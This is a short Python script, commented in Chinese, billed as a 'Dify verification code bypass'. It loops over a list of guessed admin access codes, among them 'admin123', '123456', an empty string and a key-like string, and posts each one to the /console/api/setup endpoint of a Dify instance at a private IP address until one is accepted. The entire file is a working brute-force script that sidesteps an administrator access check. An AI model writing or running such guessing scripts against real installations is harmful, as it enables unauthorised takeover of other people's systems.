#!/usr/bin/env python3
"""
Dify 验证码绕过脚本
"""
import requests
import json

def bypass_verification():
    """绕过验证码验证"""
    base_url = "http://192.168.110.88"
    
    # 常见的验证码
    codes_to_try = [
        "dify2024", "dify2025", "admin123456", "admin123", 
        "123456", "000000", "", "admin", "password",
        "sk-ai-platform-dify-integration-2024"
    ]
    
    for code in codes_to_try:
        try:
            print(f"尝试验证码: '{code}'")
            
            # 尝试验证码验证请求
            response = requests.post(
                f"{base_url}/console/api/setup",
                json={"admin_access_code": code},
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            print(f"状态码: {response.status_code}")
            
            if response.status_code == 200:
                print(f"✅ 验证码 '{code}' 成功!")
                print("响应:", response.text[:200])
                return True
            elif response.status_code == 400:
                try:
                    error_data = response.json()
                    print(f"❌ 验证失败: {error_data}")
                except:
                    print(f"❌ 验证失败: {response.text[:100]}")
            else:
                print(f"⚠️  其他响应: {response.status_code}")
                print("响应:", response.text[:100])
                
        except Exception as e:
            print(f"❌ 请求出错: {e}")
    
    return False

if __name__ == "__main__":
    print("开始尝试绕过验证码...")
    success = bypass_verification()
    if not success:
        print("❌ 所有验证码都失败了")
